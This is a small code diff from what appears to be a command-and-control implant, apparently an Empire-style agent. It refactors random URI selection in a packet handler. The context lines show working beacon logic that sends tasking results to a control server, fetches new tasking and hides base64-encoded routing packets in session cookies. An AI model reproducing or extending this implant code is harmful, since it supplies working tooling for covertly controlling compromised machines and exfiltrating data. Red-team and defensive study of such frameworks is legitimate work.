@@ -3,6 +3,8 @@ import random
 import sys
 import urllib
 
+_sysrand = random.SystemRandom()
+
 
 class ExtendedPacketHandler(PacketHandler):
     def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
@@ -19,7 +21,7 @@ class ExtendedPacketHandler(PacketHandler):
         Forwards the results of a tasking to the control server.
         """
         self.headers['Cookie'] = "session=%s" % (received_data[1:])
-        taskURI = random.SystemRandom().choice(self.taskURIs)
+        taskURI = _sysrand.choice(self.taskURIs)
         requestUri = self.server + taskURI
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
         return response
@@ -29,7 +31,7 @@ class ExtendedPacketHandler(PacketHandler):
         Forwards the get tasking to the control server.
         """
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
-        taskURI = random.SystemRandom().choice(self.taskURIs)
+        taskURI = _sysrand.choice(self.taskURIs)
         requestUri = self.server + taskURI
         response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
         return response
@@ -62,7 +64,7 @@ class ExtendedPacketHandler(PacketHandler):
             routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4)
             b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
             self.headers['Cookie'] = "{{ session_cookie }}=%s" % (b64routingPacket)
-        taskURI = random.SystemRandom().choice(self.taskURIs)
+        taskURI = _sysrand.choice(self.taskURIs)
         requestUri = self.server + taskURI
 
         try:
